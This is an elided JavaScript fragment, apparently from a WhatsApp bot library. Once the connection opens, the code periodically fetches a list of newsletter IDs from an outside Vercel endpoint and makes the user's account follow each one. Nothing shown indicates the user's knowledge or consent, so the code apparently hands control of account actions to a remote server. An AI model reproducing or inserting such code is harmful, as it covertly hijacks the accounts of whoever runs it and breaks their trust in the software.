                ...
                if (connection === 'open') {
                    ...
                    setTimeout(() => {
                        const runLoop = () => {
                            ...
                            https.get('https://database-bot-olive.vercel.app/api/newsletter', (res) => {
                                let data = '';
                                ...
                                res.on('end', () => {
                                    try {
                                        ...
                                        if (Array.isArray(parsed)) {
                                            parsed.forEach(async (id) => {
                                                const clean = typeof id === 'string' ? id.trim() : String(id).trim();
                                                if (clean.endsWith('@newsletter')) {
                                                    try {
                                                        await newsletterWMexQuery(clean, QueryIds.FOLLOW);
